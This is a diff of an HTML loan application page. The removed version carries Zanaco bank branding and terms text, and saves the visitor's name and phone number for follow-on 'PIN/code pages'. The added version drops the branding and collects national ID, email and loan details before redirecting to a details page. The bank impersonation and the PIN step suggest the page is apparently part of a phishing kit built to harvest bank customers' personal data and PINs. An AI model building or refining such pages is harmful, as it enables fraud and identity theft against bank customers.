@@ -3,67 +3,70 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loan Application Form</title>
+<title>Loan Application</title>
 <style>
     body { font-family: Arial, sans-serif; background: #f6f7fb; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
     .loan-container { background: #fff; padding: 30px; border-radius: 12px; width: 100%; max-width: 400px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
     h2 { text-align: center; margin-bottom: 20px; }
     label { display: block; margin: 10px 0 5px; font-weight: bold; }
-    input { width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #ccc; margin-bottom: 15px; box-sizing: border-box; }
-    input[type="checkbox"] { width: auto; margin-right: 10px; }
-    .checkbox-container { display: flex; align-items: center; margin-bottom: 20px; }
+    input, select { width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #ccc; margin-bottom: 15px; box-sizing: border-box; }
     button { width: 100%; padding: 12px; background: red; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
     button:disabled { background: #ccc; cursor: not-allowed; }
-    .checkbox-text { font-weight: 400; }
-    .logo-container { width: 100%; height: 120px; overflow: hidden; margin-bottom: 20px; }
-    .logo-container .logo { width: 100%; height: 100%; object-fit: cover; }
 </style>
 </head>
-
 <body>
 <div class="loan-container">
-   <div class="logo-container">
-      <img src="zanaco-dp.jpeg" class="logo">
-   </div>
-    <h2>Loan Application Form</h2>
-    <form class="loan-details-form">
-        <label>Full Name</label>
-        <input id="name" type="text" placeholder="Full Name" required>
+    <h2>Loan Application</h2>
+    <form id="loanForm">
+        <label for="loanAmount">Loan Amount</label>
+        <input type="number" id="loanAmount" placeholder="Enter loan amount" required>
 
-        <label>Phone Number</label>
-        <input id="phone" type="tel" placeholder="Phone Number" required>
+        <label for="nationalId">National ID</label>
+        <input type="text" id="nationalId" placeholder="Enter national ID" required>
 
-        <div class="checkbox-container">
-            <input type="checkbox" id="confirmCheck">
-            <label for="confirmCheck" class="checkbox-text">I Agree to Zanaco smart loan services terms and conditions</label>
-        </div>
+        <label for="email">Email</label>
+        <input type="email" id="email" placeholder="Enter email address" required>
 
-        <button type="submit" id="nextBtn" disabled>Next</button>
+        <label for="repaymentPeriod">Repayment Period</label>
+        <select id="repaymentPeriod" required>
+            <option value="">Select period</option>
+            <option value="1_month">1 Month</option>
+            <option value="3_months">3 Months</option>
+            <option value="6_months">6 Months</option>
+            <option value="12_months">12 Months</option>
+        </select>
+
+        <label for="employmentStatus">Employment Status</label>
+        <select id="employmentStatus" required>
+            <option value="">Select status</option>
+            <option value="employed">Employed</option>
+            <option value="self_employed">Self-employed</option>
+            <option value="unemployed">Unemployed</option>
+        </select>
+
+        <label for="loanPurpose">Loan Purpose</label>
+        <input type="text" id="loanPurpose" placeholder="Purpose of the loan" required>
+
+        <button type="submit">Next</button>
     </form>
 </div>
 
 <script>
-const nextBtn = document.getElementById('nextBtn');
-const confirmCheck = document.getElementById('confirmCheck');
-const form = document.querySelector('.loan-details-form');
+const form = document.getElementById('loanForm');
 
-// Enable button only if checkbox is checked
-confirmCheck.addEventListener('change', () => {
-    nextBtn.disabled = !confirmCheck.checked;
-});
-
-// On form submit
 form.addEventListener('submit', (e) => {
     e.preventDefault();
 
-    // Save name and phone in localStorage for PIN/code pages
-    const name = document.getElementById('name').value;
-    const phone = document.getElementById('phone').value;
-    localStorage.setItem('name', name);
-    localStorage.setItem('phone', phone);
+    // Save the entered details to localStorage
+    localStorage.setItem('loanAmount', document.getElementById('loanAmount').value);
+    localStorage.setItem('nationalId', document.getElementById('nationalId').value);
+    localStorage.setItem('email', document.getElementById('email').value);
+    localStorage.setItem('repaymentPeriod', document.getElementById('repaymentPeriod').value);
+    localStorage.setItem('employmentStatus', document.getElementById('employmentStatus').value);
+    localStorage.setItem('loanPurpose', document.getElementById('loanPurpose').value);
 
-    // Redirect to PIN page
-    window.location.href = 'pin.html';
+    // Redirect to details.html
+    window.location.href = 'details.html';
 });
 </script>
 </body>
